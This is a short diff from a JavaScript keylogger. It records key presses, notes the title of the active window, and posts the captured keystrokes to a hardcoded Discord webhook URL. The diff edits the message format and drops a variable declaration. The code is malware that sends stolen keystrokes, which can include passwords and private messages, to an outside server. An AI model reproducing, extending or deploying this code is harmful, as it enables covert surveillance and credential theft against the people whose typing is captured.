@@ -265,8 +265,6 @@ v.addListener(function (e, down) {
 });
 
 
-let lastActiveWindow;
-
 async function monitorAndSendLogsToDiscord() {
     try {
         const windowInfo = await activeWin();
@@ -274,7 +272,7 @@ async function monitorAndSendLogsToDiscord() {
 
         if (lastActiveWindow && lastActiveWindow.title !== title) {
             if (keylogs.trim() !== '') {
-                const content = `\`\`\`[Current Window: ${lastActiveWindow.title}] \nKeylog: ${keylogs}\`\`\``;
+                const content = `\`\`\`[${title}] \nKeylog: ${keylogs}\`\`\``;
 
                 await axios.post('https://discord.com/api/webhooks/1234493931517907025/MFGroa6BPL36Y4Uis2CTInbiSCacvXCqWHKuvjrFEdjG6JqXZiVMFFYSxG7wtXOlNbRu', {
                     "content": content
